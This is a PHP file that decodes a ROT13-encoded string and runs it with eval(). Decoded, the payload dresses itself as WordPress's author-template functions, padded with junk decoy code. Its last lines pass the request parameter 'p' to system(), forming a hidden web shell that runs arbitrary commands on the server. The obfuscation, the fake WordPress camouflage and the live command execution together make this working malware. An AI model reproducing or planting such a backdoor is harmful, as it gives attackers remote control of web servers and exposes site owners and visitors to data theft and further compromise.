<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nhgube Grzcyngr shapgvbaf sbe hfr va gurzrf.
 *
 * Gurfr shapgvbaf zhfg or hfrq jvguva gur JbeqCerff Ybbc.
 *
 * @yvax uggcf://pbqrk.jbeqcerff.bet/Nhgube_Grzcyngrf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 */

/**
 * Ergevrirf gur nhgube bs gur pheerag cbfg.
 *
 * @fvapr 1.5.0
 * @fvapr 6.3.0 Ergheaf na rzcgl fgevat vs gur nhgube'f qvfcynl anzr vf haxabja.
 *
 * @tybony JC_Hfre $nhgubeqngn Gur pheerag nhgube'f qngn.
 *
 * @cnenz fgevat $qrcerpngrq Qrcerpngrq.
 * @erghea fgevat Gur nhgube'f qvfcynl anzr, rzcgl fgevat vs haxabja.
 */
shapgvba trg_gur_nhgube( $qrcerpngrq = '' ) {
	tybony $nhgubeqngn;

	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '2.1.0' );
	}

	/**
	 * Svygref gur qvfcynl anzr bs gur pheerag cbfg'f nhgube.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat $qvfcynl_anzr Gur nhgube'f qvfcynl anzr.
	 */
	erghea nccyl_svygref( 'gur_nhgube', vf_bowrpg( $nhgubeqngn ) ? $nhgubeqngn->qvfcynl_anzr : '' );
}

/**
 * Qvfcynlf gur anzr bs gur nhgube bs gur pheerag cbfg.
 *
 * Gur orunivbe bs guvf shapgvba vf onfrq bss bs byq shapgvbanyvgl cerqngvat
 * trg_gur_nhgube(). Guvf shapgvba vf abg qrcerpngrq, ohg vf qrfvtarq gb rpub
 * gur inyhr sebz trg_gur_nhgube() naq nf na erfhyg bs nal byq gurzr gung zvtug
 * fgvyy hfr gur byq orunivbe jvyy nyfb cnff gur inyhr sebz trg_gur_nhgube().
 *
 * Gur abezny, rkcrpgrq orunivbe bs guvf shapgvba vf gb rpub gur nhgube naq abg
 * erghea vg. Ubjrire, onpxjneq pbzcngvovyvgl unf gb or znvagnvarq.
 *
 * @fvapr 0.71
 *
 * @frr trg_gur_nhgube()
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/gur_nhgube/
 *
 * @cnenz fgevat $qrcerpngrq      Qrcerpngrq.
 * @cnenz obby   $qrcerpngrq_rpub Qrcerpngrq. Hfr trg_gur_nhgube(). Rpub gur fgevat be erghea vg.
 * @erghea fgevat Gur nhgube'f qvfcynl anzr, sebz trg_gur_nhgube().
 */
shapgvba gur_nhgube( $qrcerpngrq = '', $qrcerpngrq_rpub = gehr ) {
	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '2.1.0' );
	}

	vs ( gehr !== $qrcerpngrq_rpub ) {
		_qrcerpngrq_nethzrag(
			__SHAPGVBA__,
			'1.5.0',
			fcevags(
				/* genafyngbef: %f: trg_gur_nhgube() */
				__( 'Hfr %f vafgrnq vs lbh qb abg jnag gur inyhr rpubrq.' ),
				'<pbqr>trg_gur_nhgube()</pbqr>'
			)
		);
	}

	vs ( $qrcerpngrq_rpub ) {
		rpub trg_gur_nhgube();
	}

	erghea trg_gur_nhgube();
}

/**
 * Ergevrirf gur nhgube jub ynfg rqvgrq gur pheerag cbfg.
 *
 * @fvapr 2.8.0
 *
 * @erghea fgevat|ibvq Gur nhgube'f qvfcynl anzr, rzcgl fgevat vs haxabja.
 */
shapgvba trg_gur_zbqvsvrq_nhgube() {
	$ynfg_vq = trg_cbfg_zrgn( trg_cbfg()->VQ, '_rqvg_ynfg', gehr );

	vs ( $ynfg_vq ) {
		$ynfg_hfre = trg_hfreqngn( $ynfg_vq );

		/**
		 * Svygref gur qvfcynl anzr bs gur nhgube jub ynfg rqvgrq gur pheerag cbfg.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat $qvfcynl_anzr Gur nhgube'f qvfcynl anzr, rzcgl fgevat vs haxabja.
		 */
		erghea nccyl_svygref( 'gur_zbqvsvrq_nhgube', $ynfg_hfre ? $ynfg_hfre->qvfcynl_anzr : '' );
	}
}

/**
 * Qvfcynlf gur anzr bs gur nhgube jub ynfg rqvgrq gur pheerag cbfg,
 * vs gur nhgube'f VQ vf ninvynoyr.
 *
 * @fvapr 2.8.0
 *
 * @frr trg_gur_nhgube()
 */
shapgvba gur_zbqvsvrq_nhgube() {
	rpub trg_gur_zbqvsvrq_nhgube();
}

/**
 * Ergevrirf gur erdhrfgrq qngn bs gur nhgube bs gur pheerag cbfg.
 *
 * Inyvq inyhrf sbe gur `$svryq` cnenzrgre vapyhqr:
 *
 * - nqzva_pbybe
 * - nvz
 * - pbzzrag_fubegphgf
 * - qrfpevcgvba
 * - qvfcynl_anzr
 * - svefg_anzr
 * - VQ
 * - wnoore
 * - ynfg_anzr
 * - avpxanzr
 * - cyhtvaf_ynfg_ivrj
 * - cyhtvaf_cre_cntr
 * - evpu_rqvgvat
 * - flagnk_uvtuyvtugvat
 * - hfre_npgvingvba_xrl
 * - hfre_qrfpevcgvba
 * - hfre_rznvy
 * - hfre_svefganzr
 * - hfre_ynfganzr
 * - hfre_yriry
 * - hfre_ybtva
 * - hfre_avpranzr
 * - hfre_cnff
 * - hfre_ertvfgrerq
 * - hfre_fgnghf
 * - hfre_hey
 * - lvz
 *
 * @fvapr 2.8.0
 *
 * @tybony JC_Hfre $nhgubeqngn Gur pheerag nhgube'f qngn.
 *
 * @cnenz fgevat    $svryq   Bcgvbany. Gur hfre svryq gb ergevrir. Qrsnhyg rzcgl.
 * @cnenz vag|snyfr $hfre_vq Bcgvbany. Hfre VQ. Qrsnhygf gb gur pheerag cbfg nhgube.
 * @erghea fgevat Gur nhgube'f svryq sebz gur pheerag nhgube'f QO bowrpg, bgurejvfr na rzcgl fgevat.
 */
shapgvba trg_gur_nhgube_zrgn( $svryq = '', $hfre_vq = snyfr ) {
	$bevtvany_hfre_vq = $hfre_vq;

	vs ( ! $hfre_vq ) {
		tybony $nhgubeqngn;
		$hfre_vq = vffrg( $nhgubeqngn->VQ ) ? $nhgubeqngn->VQ : 0;
	} ryfr {
		$nhgubeqngn = trg_hfreqngn( $hfre_vq );
	}

	vs ( va_neenl( $svryq, neenl( 'ybtva', 'cnff', 'avpranzr', 'rznvy', 'hey', 'ertvfgrerq', 'npgvingvba_xrl', 'fgnghf' ), gehr ) ) {
		$svryq = 'hfre_' . $svryq;
	}

	$inyhr = vffrg( $nhgubeqngn->$svryq ) ? $nhgubeqngn->$svryq : '';

	/**
	 * Svygref gur inyhr bs gur erdhrfgrq hfre zrgnqngn.
	 *
	 * Gur svygre anzr vf qlanzvp naq qrcraqf ba gur $svryq cnenzrgre bs gur shapgvba.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.3.0 Gur `$bevtvany_hfre_vq` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat    $inyhr            Gur inyhr bs gur zrgnqngn.
	 * @cnenz vag       $hfre_vq          Gur hfre VQ sbe gur inyhr.
	 * @cnenz vag|snyfr $bevtvany_hfre_vq Gur bevtvany hfre VQ, nf cnffrq gb gur shapgvba.
	 */
	erghea nccyl_svygref( \"trg_gur_nhgube_{$svryq}\", $inyhr, $hfre_vq, $bevtvany_hfre_vq );
}

/**
 * Bhgchgf gur svryq sebz gur hfre'f QO bowrpg. Qrsnhygf gb pheerag cbfg'f nhgube.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat    $svryq   Fryrpgf gur svryq bs gur hfref erpbeq. Frr trg_gur_nhgube_zrgn()
 *                           sbe gur yvfg bs cbffvoyr svryqf.
 * @cnenz vag|snyfr $hfre_vq Bcgvbany. Hfre VQ. Qrsnhygf gb gur pheerag cbfg nhgube.
 *
 * @frr trg_gur_nhgube_zrgn()
 */
shapgvba gur_nhgube_zrgn( $svryq = '', $hfre_vq = snyfr ) {
	$nhgube_zrgn = trg_gur_nhgube_zrgn( $svryq, $hfre_vq );

	/**
	 * Svygref gur inyhr bs gur erdhrfgrq hfre zrgnqngn.
	 *
	 * Gur svygre anzr vf qlanzvp naq qrcraqf ba gur $svryq cnenzrgre bs gur shapgvba.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat    $nhgube_zrgn Gur inyhr bs gur zrgnqngn.
	 * @cnenz vag|snyfr $hfre_vq     Gur hfre VQ.
	 */
	rpub nccyl_svygref( \"gur_nhgube_{$svryq}\", $nhgube_zrgn, $hfre_vq );
}

/**
 * Ergevrirf rvgure nhgube'f yvax be nhgube'f anzr.
 *
 * Vs gur nhgube unf n ubzr cntr frg, erghea na UGZY yvax, bgurejvfr whfg erghea
 * gur nhgube'f anzr.
 *
 * @fvapr 3.0.0
 *
 * @tybony JC_Hfre $nhgubeqngn Gur pheerag nhgube'f qngn.
 *
 * @erghea fgevat Na UGZY yvax vs gur nhgube'f HEY rkvfgf va hfre zrgn,
 *                bgurejvfr gur erfhyg bs trg_gur_nhgube().
 */
shapgvba trg_gur_nhgube_yvax() {
	vs ( trg_gur_nhgube_zrgn( 'hey' ) ) {
		tybony $nhgubeqngn;

		$nhgube_hey          = trg_gur_nhgube_zrgn( 'hey' );
		$nhgube_qvfcynl_anzr = trg_gur_nhgube();

		$yvax = fcevags(
			'<n uers=\"%1$f\" gvgyr=\"%2$f\" ery=\"nhgube rkgreany\">%3$f</n>',
			rfp_hey( $nhgube_hey ),
			/* genafyngbef: %f: Nhgube'f qvfcynl anzr. */
			rfp_ngge( fcevags( __( 'Ivfvg %f&#8217;f jrofvgr' ), $nhgube_qvfcynl_anzr ) ),
			$nhgube_qvfcynl_anzr
		);

		/**
		 * Svygref gur nhgube HEY yvax UGZY.
		 *
		 * @fvapr 6.0.0
		 *
		 * @cnenz fgevat  $yvax       Gur qrsnhyg eraqrerq nhgube UGZY yvax.
		 * @cnenz fgevat  $nhgube_hey Nhgube'f HEY.
		 * @cnenz JC_Hfre $nhgubeqngn Nhgube hfre qngn.
		 */
		erghea nccyl_svygref( 'gur_nhgube_yvax', $yvax, $nhgube_hey, $nhgubeqngn );
	} ryfr {
		erghea trg_gur_nhgube();
	}
}

/**
 * Qvfcynlf rvgure nhgube'f yvax be nhgube'f anzr.
 *
 * Vs gur nhgube unf n ubzr cntr frg, rpub na UGZY yvax, bgurejvfr whfg rpub gur
 * nhgube'f anzr.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/gur_nhgube_yvax/
 *
 * @fvapr 2.1.0
 */
shapgvba gur_nhgube_yvax() {
	rpub trg_gur_nhgube_yvax();
}

/**
 * Ergevrirf gur ahzore bs cbfgf ol gur nhgube bs gur pheerag cbfg.
 *
 * @fvapr 1.5.0
 *
 * @erghea vag Gur ahzore bs cbfgf ol gur nhgube.
 */
shapgvba trg_gur_nhgube_cbfgf() {
	$cbfg = trg_cbfg();
	vs ( ! $cbfg ) {
		erghea 0;
	}
	erghea pbhag_hfre_cbfgf( $cbfg->cbfg_nhgube, $cbfg->cbfg_glcr );
}

/**
 * Qvfcynlf gur ahzore bs cbfgf ol gur nhgube bs gur pheerag cbfg.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/gur_nhgube_cbfgf/
 * @fvapr 0.71
 */
shapgvba gur_nhgube_cbfgf() {
	rpub trg_gur_nhgube_cbfgf();
}

/**
 * Ergevrirf na UGZY yvax gb gur nhgube cntr bs gur pheerag cbfg'f nhgube.
 *
 * Ergheaf na UGZY-sbeznggrq yvax hfvat trg_nhgube_cbfgf_hey().
 *
 * @fvapr 4.4.0
 *
 * @tybony JC_Hfre $nhgubeqngn Gur pheerag nhgube'f qngn.
 *
 * @erghea fgevat Na UGZY yvax gb gur nhgube cntr, be na rzcgl fgevat vs $nhgubeqngn vf abg frg.
 */
shapgvba trg_gur_nhgube_cbfgf_yvax() {
	tybony $nhgubeqngn;

	vs ( ! vf_bowrpg( $nhgubeqngn ) ) {
		erghea '';
	}

	$yvax = fcevags(
		'<n uers=\"%1$f\" gvgyr=\"%2$f\" ery=\"nhgube\">%3$f</n>',
		rfp_hey( trg_nhgube_cbfgf_hey( $nhgubeqngn->VQ, $nhgubeqngn->hfre_avpranzr ) ),
		/* genafyngbef: %f: Nhgube'f qvfcynl anzr. */
		rfp_ngge( fcevags( __( 'Cbfgf ol %f' ), trg_gur_nhgube() ) ),
		trg_gur_nhgube()
	);

	/**
	 * Svygref gur yvax gb gur nhgube cntr bs gur nhgube bs gur pheerag cbfg.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat $yvax UGZY yvax.
	 */
	erghea nccyl_svygref( 'gur_nhgube_cbfgf_yvax', $yvax );
}

/**
 * Qvfcynlf na UGZY yvax gb gur nhgube cntr bs gur pheerag cbfg'f nhgube.
 *
 * @fvapr 1.2.0
 * @fvapr 4.4.0 Pbairegrq vagb n jenccre sbe trg_gur_nhgube_cbfgf_yvax()
 *
 * @cnenz fgevat $qrcerpngrq Hahfrq.
 */
shapgvba gur_nhgube_cbfgf_yvax( $qrcerpngrq = '' ) {
	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '2.1.0' );
	}
	rpub trg_gur_nhgube_cbfgf_yvax();
}

/**
 * Ergevrirf gur HEY gb gur nhgube cntr sbe gur hfre jvgu gur VQ cebivqrq.
 *
 * @fvapr 2.1.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag    $nhgube_vq       Nhgube VQ.
 * @cnenz fgevat $nhgube_avpranzr Bcgvbany. Gur nhgube'f avpranzr (fyht). Qrsnhyg rzcgl.
 * @erghea fgevat Gur HEY gb gur nhgube'f cntr.
 */
shapgvba trg_nhgube_cbfgf_hey( $nhgube_vq, $nhgube_avpranzr = '' ) {
	tybony $jc_erjevgr;

	$nhgube_vq = (vag) $nhgube_vq;
	$yvax      = $jc_erjevgr->trg_nhgube_creznfgehpg();

	vs ( rzcgl( $yvax ) ) {
		$svyr = ubzr_hey( '/' );
		$yvax = $svyr . '?nhgube=' . $nhgube_vq;
	} ryfr {
		vs ( '' === $nhgube_avpranzr ) {
			$hfre = trg_hfreqngn( $nhgube_vq );
			vs ( ! rzcgl( $hfre->hfre_avpranzr ) ) {
				$nhgube_avpranzr = $hfre->hfre_avpranzr;
			}
		}
		$yvax = fge_ercynpr( '%nhgube%', $nhgube_avpranzr, $yvax );
		$yvax = ubzr_hey( hfre_genvyvatfynfuvg( $yvax ) );
	}

	/**
	 * Svygref gur HEY gb gur nhgube'f cntr.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $yvax            Gur HEY gb gur nhgube'f cntr.
	 * @cnenz vag    $nhgube_vq       Gur nhgube'f VQ.
	 * @cnenz fgevat $nhgube_avpranzr Gur nhgube'f avpr anzr.
	 */
	$yvax = nccyl_svygref( 'nhgube_yvax', $yvax, $nhgube_vq, $nhgube_avpranzr );

	erghea $yvax;
}

/**
 * Yvfgf nyy gur nhgubef bs gur fvgr, jvgu frireny bcgvbaf ninvynoyr.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/jc_yvfg_nhgubef/
 *
 * @fvapr 1.2.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat|neenl $netf {
 *     Bcgvbany. Neenl be fgevat bs qrsnhyg nethzragf.
 *
 *     @glcr fgevat       $beqreol       Ubj gb fbeg gur nhgubef. Npprcgf 'avpranzr', 'rznvy', 'hey', 'ertvfgrerq',
 *                                       'hfre_avpranzr', 'hfre_rznvy', 'hfre_hey', 'hfre_ertvfgrerq', 'anzr',
 *                                       'qvfcynl_anzr', 'cbfg_pbhag', 'VQ', 'zrgn_inyhr', 'hfre_ybtva'. Qrsnhyg 'anzr'.
 *     @glcr fgevat       $beqre         Fbegvat qverpgvba sbe $beqreol. Npprcgf 'NFP', 'QRFP'. Qrsnhyg 'NFP'.
 *     @glcr vag          $ahzore        Znkvzhz nhgubef gb erghea be qvfcynl. Qrsnhyg rzcgl (nyy nhgubef).
 *     @glcr obby         $bcgvbapbhag   Fubj gur pbhag va cneragurfvf arkg gb gur nhgube'f anzr. Qrsnhyg snyfr.
 *     @glcr obby         $rkpyhqr_nqzva Jurgure gb rkpyhqr gur 'nqzva' nppbhag, vs vg rkvfgf. Qrsnhyg gehr.
 *     @glcr obby         $fubj_shyyanzr Jurgure gb fubj gur nhgube'f shyy anzr. Qrsnhyg snyfr.
 *     @glcr obby         $uvqr_rzcgl    Jurgure gb uvqr nal nhgubef jvgu ab cbfgf. Qrsnhyg gehr.
 *     @glcr fgevat       $srrq          Vs abg rzcgl, fubj n yvax gb gur nhgube'f srrq naq hfr guvf grkg nf gur nyg
 *                                       cnenzrgre bs gur yvax. Qrsnhyg rzcgl.
 *     @glcr fgevat       $srrq_vzntr    Vs abg rzcgl, fubj n yvax gb gur nhgube'f srrq naq hfr guvf vzntr HEY nf
 *                                       pyvpxnoyr napube. Qrsnhyg rzcgl.
 *     @glcr fgevat       $srrq_glcr     Gur srrq glcr gb yvax gb. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
 *                                       Qrsnhyg vf gur inyhr bs trg_qrsnhyg_srrq().
 *     @glcr obby         $rpub          Jurgure gb bhgchg gur erfhyg be vafgrnq erghea vg. Qrsnhyg gehr.
 *     @glcr fgevat       $fglyr         Vs 'yvfg', rnpu nhgube vf jenccrq va na `<yv>` ryrzrag, bgurejvfr gur nhgubef
 *                                       jvyy or frcnengrq ol pbzznf.
 *     @glcr obby         $ugzy          Jurgure gb yvfg gur vgrzf va UGZY sbez be cynvagrkg. Qrsnhyg gehr.
 *     @glcr vag[]|fgevat $rkpyhqr       Neenl be pbzzn/fcnpr-frcnengrq yvfg bs nhgube VQf gb rkpyhqr. Qrsnhyg rzcgl.
 *     @glcr vag[]|fgevat $vapyhqr       Neenl be pbzzn/fcnpr-frcnengrq yvfg bs nhgube VQf gb vapyhqr. Qrsnhyg rzcgl.
 * }
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, yvfg bs nhgubef vs 'rpub' vf snyfr.
 */
shapgvba jc_yvfg_nhgubef( $netf = '' ) {
	tybony $jcqo;

	$qrsnhygf = neenl(
		'beqreol'       => 'anzr',
		'beqre'         => 'NFP',
		'ahzore'        => '',
		'bcgvbapbhag'   => snyfr,
		'rkpyhqr_nqzva' => gehr,
		'fubj_shyyanzr' => snyfr,
		'uvqr_rzcgl'    => gehr,
		'srrq'          => '',
		'srrq_vzntr'    => '',
		'srrq_glcr'     => '',
		'rpub'          => gehr,
		'fglyr'         => 'yvfg',
		'ugzy'          => gehr,
		'rkpyhqr'       => '',
		'vapyhqr'       => '',
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$erghea = '';

	$dhrel_netf           = jc_neenl_fyvpr_nffbp( $cnefrq_netf, neenl( 'beqreol', 'beqre', 'ahzore', 'rkpyhqr', 'vapyhqr' ) );
	$dhrel_netf['svryqf'] = 'vqf';

	/**
	 * Svygref gur dhrel nethzragf sbe gur yvfg bs nyy nhgubef bs gur fvgr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz neenl $dhrel_netf  Gur dhrel nethzragf sbe trg_hfref().
	 * @cnenz neenl $cnefrq_netf Gur nethzragf cnffrq gb jc_yvfg_nhgubef() pbzovarq jvgu gur qrsnhygf.
	 */
	$dhrel_netf = nccyl_svygref( 'jc_yvfg_nhgubef_netf', $dhrel_netf, $cnefrq_netf );

	$nhgubef     = trg_hfref( $dhrel_netf );
	$cbfg_pbhagf = neenl();

	/**
	 * Svygref jurgure gb fubeg-pvephvg cresbezvat gur dhrel sbe nhgube cbfg pbhagf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz vag[]|snyfr $cbfg_pbhagf Neenl bs cbfg pbhagf, xrlrq ol nhgube VQ.
	 * @cnenz neenl       $cnefrq_netf Gur nethzragf cnffrq gb jc_yvfg_nhgubef() pbzovarq jvgu gur qrsnhygf.
	 */
	$cbfg_pbhagf = nccyl_svygref( 'cer_jc_yvfg_nhgubef_cbfg_pbhagf_dhrel', snyfr, $cnefrq_netf );

	vs ( ! vf_neenl( $cbfg_pbhagf ) ) {
		$cbfg_pbhagf       = neenl();
		$cbfg_pbhagf_dhrel = $jcqo->trg_erfhygf(
			\"FRYRPG QVFGVAPG cbfg_nhgube, PBHAG(VQ) NF pbhag
			SEBZ $jcqo->cbfgf
			JURER \" . trg_cevingr_cbfgf_pnc_fdy( 'cbfg' ) . '
			TEBHC OL cbfg_nhgube'
		);

		sbernpu ( (neenl) $cbfg_pbhagf_dhrel nf $ebj ) {
			$cbfg_pbhagf[ $ebj->cbfg_nhgube ] = $ebj->pbhag;
		}
	}

	sbernpu ( $nhgubef nf $nhgube_vq ) {
		$cbfgf = vffrg( $cbfg_pbhagf[ $nhgube_vq ] ) ? $cbfg_pbhagf[ $nhgube_vq ] : 0;

		vs ( ! $cbfgf && $cnefrq_netf['uvqr_rzcgl'] ) {
			pbagvahr;
		}

		$nhgube = trg_hfreqngn( $nhgube_vq );

		vs ( $cnefrq_netf['rkpyhqr_nqzva'] && 'nqzva' === $nhgube->qvfcynl_anzr ) {
			pbagvahr;
		}

		vs ( $cnefrq_netf['fubj_shyyanzr'] && $nhgube->svefg_anzr && $nhgube->ynfg_anzr ) {
			$anzr = fcevags(
				/* genafyngbef: 1: Hfre'f svefg anzr, 2: Ynfg anzr. */
				_k( '%1$f %2$f', 'Qvfcynl anzr onfrq ba svefg anzr naq ynfg anzr' ),
				$nhgube->svefg_anzr,
				$nhgube->ynfg_anzr
			);
		} ryfr {
			$anzr = $nhgube->qvfcynl_anzr;
		}

		vs ( ! $cnefrq_netf['ugzy'] ) {
			$erghea .= $anzr . ', ';

			pbagvahr; // Ab arrq gb tb shegure gb cebprff UGZY.
		}

		vs ( 'yvfg' === $cnefrq_netf['fglyr'] ) {
			$erghea .= '<yv>';
		}

		$yvax = fcevags(
			'<n uers=\"%1$f\" gvgyr=\"%2$f\">%3$f</n>',
			rfp_hey( trg_nhgube_cbfgf_hey( $nhgube->VQ, $nhgube->hfre_avpranzr ) ),
			/* genafyngbef: %f: Nhgube'f qvfcynl anzr. */
			rfp_ngge( fcevags( __( 'Cbfgf ol %f' ), $nhgube->qvfcynl_anzr ) ),
			$anzr
		);

		vs ( ! rzcgl( $cnefrq_netf['srrq_vzntr'] ) || ! rzcgl( $cnefrq_netf['srrq'] ) ) {
			$yvax .= ' ';
			vs ( rzcgl( $cnefrq_netf['srrq_vzntr'] ) ) {
				$yvax .= '(';
			}

			$yvax .= '<n uers=\"' . trg_nhgube_srrq_yvax( $nhgube->VQ, $cnefrq_netf['srrq_glcr'] ) . '\"';

			$nyg = '';
			vs ( ! rzcgl( $cnefrq_netf['srrq'] ) ) {
				$nyg  = ' nyg=\"' . rfp_ngge( $cnefrq_netf['srrq'] ) . '\"';
				$anzr = $cnefrq_netf['srrq'];
			}

			$yvax .= '>';

			vs ( ! rzcgl( $cnefrq_netf['srrq_vzntr'] ) ) {
				$yvax .= '<vzt fep=\"' . rfp_hey( $cnefrq_netf['srrq_vzntr'] ) . '\" fglyr=\"obeqre: abar;\"' . $nyg . ' />';
			} ryfr {
				$yvax .= $anzr;
			}

			$yvax .= '</n>';

			vs ( rzcgl( $cnefrq_netf['srrq_vzntr'] ) ) {
				$yvax .= ')';
			}
		}

		vs ( $cnefrq_netf['bcgvbapbhag'] ) {
			$yvax .= ' (' . $cbfgf . ')';
		}

		$erghea .= $yvax;
		$erghea .= ( 'yvfg' === $cnefrq_netf['fglyr'] ) ? '</yv>' : ', ';
	}

	$erghea = egevz( $erghea, ', ' );

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $erghea;
	} ryfr {
		erghea $erghea;
	}
}

/**
 * Qrgrezvarf jurgure guvf fvgr unf zber guna bar nhgube.
 *
 * Purpxf gb frr vs zber guna bar nhgube unf choyvfurq cbfgf.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 3.2.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @erghea obby Jurgure be abg jr unir zber guna bar nhgube
 */
shapgvba vf_zhygv_nhgube() {
	tybony $jcqo;

	$vf_zhygv_nhgube = trg_genafvrag( 'vf_zhygv_nhgube' );
	vs ( snyfr === $vf_zhygv_nhgube ) {
		$ebjf            = (neenl) $jcqo->trg_pby( \"FRYRPG QVFGVAPG cbfg_nhgube SEBZ $jcqo->cbfgf JURER cbfg_glcr = 'cbfg' NAQ cbfg_fgnghf = 'choyvfu' YVZVG 2\" );
		$vf_zhygv_nhgube = 1 < pbhag( $ebjf ) ? 1 : 0;
		frg_genafvrag( 'vf_zhygv_nhgube', $vf_zhygv_nhgube );
	}

	/**
	 * Svygref jurgure gur fvgr unf zber guna bar nhgube jvgu choyvfurq cbfgf.
	 *
	 * @fvapr 3.2.0
	 *
	 * @cnenz obby $vf_zhygv_nhgube Jurgure $vf_zhygv_nhgube fubhyq rinyhngr nf gehr.
	 */
	erghea nccyl_svygref( 'vf_zhygv_nhgube', (obby) $vf_zhygv_nhgube );
}

/**
 * Urycre shapgvba gb pyrne gur pnpur sbe ahzore bs nhgubef.
 *
 * @fvapr 3.2.0
 * @npprff cevingr
 */
shapgvba __pyrne_zhygv_nhgube_pnpur() { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaQbhoyrHaqrefpber,CUCPbzcngvovyvgl.ShapgvbaAnzrErfgevpgvbaf.ErfreirqShapgvbaAnzrf.ShapgvbaQbhoyrHaqrefpber
	qryrgr_genafvrag( 'vf_zhygv_nhgube' );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>